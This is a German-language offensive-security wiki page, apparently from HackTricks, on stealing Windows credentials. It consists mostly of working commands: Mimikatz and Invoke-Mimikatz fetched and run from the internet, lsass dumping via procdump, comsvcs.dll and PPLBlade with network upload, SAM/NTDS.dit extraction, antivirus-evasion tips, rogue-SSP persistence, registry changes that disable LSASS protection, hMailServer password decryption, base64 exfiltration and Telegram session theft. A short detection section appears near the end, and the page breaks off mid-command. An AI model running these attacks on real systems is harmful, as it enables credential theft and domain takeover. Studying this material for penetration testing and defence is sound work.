# Windows-Anmeldedaten stehlen

{{#include ../../banners/hacktricks-training.md}}

## Anmeldedaten Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Weitere Dinge, die Mimikatz tun kann, findest du auf** [**dieser Seite**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Erfahre hier mehr über einige mögliche Schutzmaßnahmen für Anmeldeinformationen.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten Mimikatz daran hindern, einige Anmeldeinformationen auszulesen.**

## Anmeldeinformationen mit Meterpreter

Verwende das [**Credentials-Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um **Passwörter und Hashes** auf dem Zielsystem zu suchen.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals **](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Mit diesem Tool kannst du den **lsass-Prozess dumpen**, den **Dump herunterladen** und die **Credentials lokal** aus dem Dump **extrahieren**.

Du kannst auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) ausgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Manche **AV** erkennen die Verwendung von **procdump.exe zum Dumpen von lsass.exe** möglicherweise als **schädlich**, weil sie die Zeichenfolgen **„procdump.exe“ und „lsass.exe“** erkennen. Daher ist es **unauffälliger**, **als Argument** die **PID** von lsass.exe an procdump **zu übergeben statt** des **Namens lsass.exe.**

### Dumpen von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll** in `C:\Windows\System32` ist dafür zuständig, bei einem Absturz den **Prozessspeicher zu dumpen**. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mit `rundll32.exe` aufgerufen werden soll.\
Die ersten beiden Argumente sind irrelevant, das dritte ist jedoch in drei Komponenten unterteilt. Die Prozess-ID des zu dumpenden Prozesses bildet die erste Komponente, der Speicherort der Dump-Datei die zweite und die dritte Komponente ist zwingend das Wort **full**. Es gibt keine alternativen Optionen.\
Nachdem diese drei Komponenten analysiert wurden, erstellt die DLL die Dump-Datei und überträgt den Speicher des angegebenen Prozesses in diese Datei.\
Die **comsvcs.dll** kann zum Dumpen des lsass-Prozesses verwendet werden, sodass procdump nicht hochgeladen und ausgeführt werden muss. Diese Methode wird ausführlich unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.<sup>[[9]](#references)</sup>

Der folgende Befehl wird zur Ausführung verwendet:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Diesen Prozess kannst du mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **lsass-Dump mit dem Task-Manager**

1. Klicke mit der rechten Maustaste auf die Taskleiste und dann auf „Task-Manager“.
2. Klicke auf „Mehr Details“.
3. Suche im Tab „Prozesse“ nach dem Prozess „Local Security Authority Process“.
4. Klicke mit der rechten Maustaste auf den Prozess „Local Security Authority Process“ und dann auf „Abbilddatei erstellen“.

### lsass-Dump mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei und Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-Suite.

Ein bereits vorhandener vollständiger Systemabsturz-Dump oder eine komprimierte Kopie in einem zugänglichen Benutzerordner kann Anmeldedatenmaterial enthalten, das sich offline analysieren lässt. Dateinamen wie `MEMORY.DMP` und `MEMORY.7z` sind lediglich Hinweise für die Überprüfung: Verifiziere Herkunft und Zugriff und gehe nicht davon aus, dass sie verwendbare oder aktuelle Anmeldedaten enthalten.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das Memory-Dumps verschleiern und auf Remote-Workstations übertragen kann, ohne sie auf der Festplatte abzulegen.

**Wichtige Funktionen**:

1. PPL-Schutz umgehen
2. Memory-Dump-Dateien verschleiern, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Memory-Dumps mit RAW- und SMB-Upload-Methoden hochladen, ohne sie auf der Festplatte abzulegen (fileless Dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-basiertes LSASS-Dumping ohne MiniDumpWriteDump

Ink Dragon setzt einen dreistufigen Dumper namens **LalsDumper** ein, der niemals `MiniDumpWriteDump` aufruft, sodass EDR-Hooks für diese API nie ausgelöst werden:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – sucht in `fdp.dll` nach einem Platzhalter aus 32 kleinen `d`-Zeichen, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die bösartige DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 innerhalb von LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XOR-verknüpft jedes Byte mit `0x20` und mappt den dekodierten Blob in den Speicher, bevor sie die Ausführung übergibt.
3. **Stage 3 dumper** – implementiert die MiniDump-Logik mithilfe von **direct syscalls** neu, die über gehashte API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt den Handle, damit die Exfiltration später erfolgen kann.

Hinweise für Operatoren:

* `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` müssen sich im selben Verzeichnis befinden. Stage 1 ersetzt den fest codierten Platzhalter durch den absoluten Pfad zu `rtu.txt`. Werden die Dateien getrennt, wird die Chain unterbrochen.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst eintragen, damit LSASS den SSP bei jedem Start erneut lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Dekomprimiere sie lokal und übergib sie anschließend zur Credential-Extraktion an Mimikatz/Volatility.
* Zum Ausführen von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist. Sobald der Aufruf zurückkehrt, lädt LSASS transparent den Rogue-SSP und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte wirft sie nicht aus LSASS. Lösche entweder den Registry-Eintrag und starte LSASS neu (Neustart) oder belasse sie für langfristige Persistenz.

## CrackMapExec

### SAM-Hashes dumpen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA-Secrets dumpen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### NTDS.dit vom Ziel-DC dumpen

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump des NTDS.dit-Passwortverlaufs vom Ziel-DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Das pwdLastSet-Attribut für jedes NTDS.dit-Konto anzeigen

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM stehlen

Diese Dateien sollten sich unter _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM_ **befinden**. Du kannst sie jedoch **nicht einfach auf herkömmliche Weise kopieren**, da sie geschützt sind.

### Aus der Registry

Am einfachsten lassen sich diese Dateien stehlen, indem du eine Kopie aus der Registry abrufst:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Lade** diese Dateien auf deinen Kali-Rechner herunter und **extrahiere die Hashes** mit:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Mit diesem Dienst können Sie Kopien geschützter Dateien erstellen. Sie müssen Administrator sein.

#### Using vssadmin

Die vssadmin-Binärdatei ist nur in Windows-Server-Versionen verfügbar.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Aber du kannst dasselbe auch mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (das verwendete Laufwerk ist „C:“ und die Datei wird unter C:\users\Public gespeichert), aber du kannst damit jede geschützte Datei kopieren:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Schließlich können Sie auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory-Anmeldedaten – NTDS.dit**

Die Datei **NTDS.dit** gilt als Herzstück von **Active Directory** und enthält wichtige Daten zu Benutzerobjekten, Gruppen und deren Mitgliedschaften. In ihr werden die **Passwort-Hashes** der Domänenbenutzer gespeichert. Diese Datei ist eine Datenbank der **Extensible Storage Engine (ESE)** und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

In dieser Datenbank werden drei primäre Tabellen verwaltet:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Link Table**: Sie erfasst Beziehungen, etwa Gruppenmitgliedschaften.
- **SD Table**: Hier werden die **Sicherheitsdeskriptoren** für jedes Objekt gespeichert, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.

Christoffer Anderssons Forschung zur Datenbankschicht dokumentiert diese Tabellen und ihr versionsabhängiges Verhalten genauer.<sup>[[8]](#references)</sup>

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren; sie wird von _lsass.exe_ verwendet. Daher kann sich ein **Teil** der Datei **NTDS.dit** im Speicher von **`lsass`** befinden (wahrscheinlich findest du dort die zuletzt abgerufenen Daten, da zur Leistungsverbesserung ein **Cache** verwendet wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash wird dreimal verschlüsselt:

1. Den Password Encryption Key (**PEK**) mit dem **BOOTKEY** und **RC4** entschlüsseln.
2. Den **Hash** mit dem **PEK** und **RC4** entschlüsseln.
3. Den **Hash** mit **DES** entschlüsseln.

Der **PEK** hat auf jedem Domänencontroller **denselben Wert**, ist jedoch in **NTDS.dit** mit dem domänenspezifischen **BOOTKEY** dieses Domänencontrollers aus der **SYSTEM**-Hive **verschlüsselt**. Zum Extrahieren von Anmeldedaten werden daher sowohl **NTDS.dit** als auch **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) benötigt.

### NTDS.dit mit Ntdsutil kopieren

Seit Windows Server 2008 verfügbar.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

You could also use den [**volume shadow copy**](#stealing-sam-and-system)-Trick, um die Datei **ntds.dit** zu kopieren. Denke daran, dass du auch eine Kopie der **SYSTEM-Datei** benötigst (nutze wieder den [**dump aus der Registry oder den volume shadow copy**](#stealing-sam-and-system)-Trick).

### **Hashes aus NTDS.dit extrahieren**

Sobald du die Dateien **NTDS.dit** und **SYSTEM** **erhalten** hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Sie können sie auch automatisch mit einem gültigen Domänenadministratorkonto **extrahieren**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich kannst du auch das **Metasploit-Modul** _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Domänenobjekte aus NTDS.dit in eine SQLite-Datenbank extrahieren**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Secrets, sondern auch die vollständigen Objekte und ihre Attribute extrahiert, um weitere Informationen zu gewinnen, sobald die rohe NTDS.dit-Datei abgerufen wurde.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Die `SYSTEM`-Hive ist optional, ermöglicht aber die Entschlüsselung von Secrets (NT- und LM-Hashes, zusätzliche Anmeldedaten wie Klartextpasswörter, Kerberos- oder Trust-Keys sowie NT- und LM-Passwortverläufe). Außerdem werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel der letzten Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, der Baum der Organisationseinheiten und deren Mitgliedschaften sowie vertrauenswürdige Domänen mit Trust-Typ, Richtung und Attributen ...

## Lazagne

Lade die Binärdatei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Mit dieser Binärdatei kannst du Anmeldedaten aus verschiedenen Programmen extrahieren.

```
lazagne.exe all
```

## Weitere Tools zum Extrahieren von Zugangsdaten aus SAM und LSASS

### Windows credentials Editor (WCE)

Mit diesem Tool lassen sich Zugangsdaten aus dem Arbeitsspeicher extrahieren. Download: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Zugangsdaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Anmeldedaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Lade es hier herunter:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) und **führe es einfach aus**. Die Passwörter werden extrahiert.

## Inaktive RDP-Sitzungen auswerten und Sicherheitskontrollen schwächen

FinalDraft RAT von Ink Dragon enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:<sup>[[3]](#references)</sup>

### Telemetrieerfassung im Stil von DumpRDPHistory

* **Ausgehende RDP-Ziele** – Durchsuche jede Benutzerstruktur unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitpunkt der letzten Änderung. Du kannst FinalDrafts Logik mit PowerShell nachbilden:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Nachweise für eingehende RDP-Verbindungen** – frage das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach den Ereignis-IDs **21** (erfolgreiche Anmeldung) und **25** (Verbindung getrennt) ab, um festzustellen, wer den Rechner administriert hat:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Sobald du weißt, welcher Domain Admin sich regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), solange dessen **getrennte** Sitzung noch besteht. CredSSP + NTLM-Fallback hinterlassen ihren Verifier und ihre Tokens in LSASS, die dann über SMB/WinRM wiedergegeben werden können, um `NTDS.dit` abzugreifen oder Persistenz auf Domain Controllern einzurichten.

### Registry-Downgrades, auf die FinalDraft abzielt

Das Implantat manipuliert außerdem mehrere Registry-Schlüssel, um Credential Theft zu erleichtern:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Die Einstellung `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von Credentials/Tickets während RDP und ermöglicht Pass-the-Hash-artige Pivots.
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Tokenfilterung, sodass lokale Admins über das Netzwerk uneingeschränkte Tokens erhalten.
* `DSRMAdminLogonBehavior=2` ermöglicht dem DSRM-Administrator die Anmeldung, während der DC online ist, und bietet Angreifern damit ein weiteres integriertes Konto mit hohen Rechten.
* `RunAsPPL=0` entfernt den LSASS-PPL-Schutz und macht den Speicherzugriff für Dumper wie LalsDumper trivial.

## hMailServer-Konfigurations-Credentials (nach dem Kompromittieren)

Prüfen Sie anhand des Installationslayouts die genauen Konfigurationsdateien `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` und `C:\ProgramData\hMailServer\hMailServer.ini`. Ein lesbarer, nicht leerer Wert für `[Security] AdministratorPassword=` ist ein hMailServer-Administrationspasswort-Hash; er ist kein Beleg für ein Windows-Administratorpasswort. Wird dieses Credential wiederhergestellt, setzt jeder Pivot zu einem Windows-Konto die unabhängig verifizierte Wiederverwendung des Passworts und entsprechende Anmelderechte voraus.

Bei Installationen mit einer SQL CE-Datenbank schützt der separate Wert `[Database] Password=` in der INI-Datei die Datenbank. In älteren Installationen ist dieser Wert mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` und durch Vertauschen der Endianness von 4-Byte-Wörtern mit Blowfish verschlüsselt. Verwenden Sie den Hex-String aus der INI-Datei mit diesem Python-Snippet:<sup>[[2]](#references)</sup>

Vergewissern Sie sich zuerst, dass das aktuelle Konto sowohl die INI-Datei als auch die zugehörige SQL CE-`.sdf`-Datenbank lesen kann. Das INI-Passwort schützt die Datenbank; es ist von den darin gespeicherten Hashes der Mailbox-Konten getrennt. Untersuchen oder aktualisieren Sie eine **Kopie** einer verwendeten Datenbank, niemals die aktive Datei.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Mit dem Klartextpasswort die SQL CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und bei Bedarf ein Upgrade durchführen, bevor die Hashes abgefragt werden:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Die Spalte `accountpassword` verwendet das hMailServer-Hashformat (hashcat mode `1421`). Ein geknacktes Postfachpasswort ermöglicht nur dann einen Windows-Benutzer-Pivot, wenn dasselbe Passwort von einem lokalen/Domänenkonto verwendet wird und dieses Konto über die erforderlichen Rechte für die Remoteanmeldung verfügt.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Einige Tools erfassen **Klartext-Anmeldepasswörter**, indem sie den LSA-Anmelde-Callback `LsaApLogonUserEx2` abfangen. Dabei wird der Callback des Authentication Package gehookt oder umhüllt, um Zugangsdaten **während der Anmeldung** (vor dem Hashing) zu erfassen und anschließend auf dem Datenträger zu speichern oder an den Operator zurückzugeben. Dies wird häufig mit einem Helfer umgesetzt, der in LSA injiziert oder dort registriert wird und dann jedes erfolgreiche interaktive Netzwerk-Anmeldeereignis mit Benutzername, Domäne und Passwort protokolliert.<sup>[[1]](#references)</sup>

Hinweise zum Betrieb:
- Erfordert lokale Administratorrechte/SYSTEM, um den Helfer in den Authentifizierungspfad zu laden.
- Erfasste Zugangsdaten erscheinen nur, wenn eine Anmeldung stattfindet (je nach Hook interaktive Anmeldung, RDP-, Dienst- oder Netzwerkanmeldung).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert gespeicherte Verbindungsinformationen in einer benutzerspezifischen Datei `sqlstudio.bin`. Spezielle Dumper können die Datei parsen und gespeicherte SQL-Zugangsdaten wiederherstellen. In Shells, die nur die Befehlsausgabe zurückgeben, wird die Datei häufig exfiltriert, indem sie als Base64 kodiert und auf stdout ausgegeben wird.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Auf der Operator-Seite die Datei neu erstellen und den Dumper lokal ausführen, um Zugangsdaten wiederherzustellen:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Diebstahl von Telegram-Desktop-`tdata`-Sessions

Telegram Desktop speichert Autorisierungs- und Kontodaten in seinem **`tdata`**-Verzeichnis. Eine kopierte Session kann mit kompatiblen Tools geladen werden, um sich ohne Kontopasswort zu authentifizieren, solange diese Autorisierung gültig ist. Wenn die Verschlüsselung lokaler Daten aktiviert ist, benötigt der Stealer zusätzlich den Passcode. Eine authentifizierte Session kann anschließend Identitätsdaten, Dialog- und Mitgliedschaftsmetadaten, Nachrichten sowie herunterladbare Medien offenlegen.<sup>[[10]](#references)</sup>

### Auffinden und Beschaffen

Durchsuche sowohl installierte als auch portable Verzeichnisstrukturen. Die Namen der Microsoft-Store-Pakete variieren. Liste daher Paketverzeichnisse auf, die `TelegramMessenge` enthalten, und untersuche deren Unterverzeichnis `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Wenn gewöhnliche Lesezugriffe fehlschlagen und das Prozesstoken `SeBackupPrivilege` **bereits enthält und aktiviert hat**, bietet backup-aware access eine Ausweichmöglichkeit; dadurch wird das Privileg weder erlangt noch der Prozess erhöht. `CreateFileW` mit `FILE_FLAG_BACKUP_SEMANTICS` kann Backup-/Restore-Semantik anfordern und Dateisicherheitsprüfungen umgehen, wenn die erforderlichen Token-Privilegien vorhanden sind. Das Flag allein setzt jedoch keine inkompatible Freigabesperre außer Kraft.<sup>[[10]](#references)[[11]](#references)</sup>

Erstellen/lesen Sie bei live gesperrten Dateien eine **Volume Shadow Copy**; bei durch ACLs blockierten Dateien verwendet `robocopy /B` den Backup-Modus und setzt Datei- und Verzeichnis-ACLs außer Kraft.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ein bandbreitenbewusstes Implantat übermittelt möglicherweise zuerst nur das Dateipfad-Inventar, erhält eine Snapshot-ID sowie die Pfade, die bereits beim C2 gespeichert sind, und lädt nur fehlende Dateien hoch. Daher können selbst kleine inkrementelle Übertragungen nach einer rekursiven `tdata`-Auflistung auf einen erfolgreichen Diebstahl einer Sitzung hindeuten.<sup>[[10]](#references)</sup>

### Erkennung und Eindämmung

Korrelieren Sie den rekursiven Zugriff eines Nicht-Telegram-Prozesses auf `tdata` mit der Aktivierung von `SeBackupPrivilege`, Dateiöffnungen mit Backup-Semantik, VSS-Aktivität oder einem untergeordneten `robocopy.exe`, das `/B` verwendet. Suchen Sie außerdem nach einer schnellen Auflistung von `%APPDATA%` und `%LOCALAPPDATA%\Packages`, gefolgt von ausgehenden Verbindungen desselben Prozesses. Beenden Sie nach einer Kompromittierung unter **Einstellungen → Geräte** (oder **Datenschutz & Sicherheit → Aktive Sitzungen**) nicht erkannte Sitzungen. Das Aktivieren der Bestätigung in zwei Schritten allein widerruft keine bereits gestohlene Autorisierung.<sup>[[10]](#references)[[13]](#references)</sup>

## Diebstahl von Passkeys / WebAuthn-Anmeldedaten aus Chrome unter Windows

Wenn auf einem Windows-Host mit **Chrome + in Google Password Manager synchronisierten Passkeys** Code als **betroffener Benutzer** ausgeführt werden kann, sind Passkeys ein interessantes Ziel nach der Kompromittierung – selbst **ohne Administrator-/SYSTEM-Rechte**.<sup>[[4]](#references)</sup>

### Interessante lokale Artefakte

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** speichert protobuf-kodierte **`WebauthnCredentialSpecifics`**-Datensätze. Ein Prozess desselben Benutzers kann die **RP ID**, den **Benutzernamen**, die **Credential-ID** und verschlüsseltes Material privater Schlüssel für synchronisierte Passkeys auflisten.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** speichert den lokalen Geräteeinbindungsstatus, etwa **`wrapped_identity_private_key`** und das verpackte Geheimnis zur Wiederherstellung synchronisierter Anmeldedaten.<sup>[[4]](#references)</sup>

Schnell-Triage:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
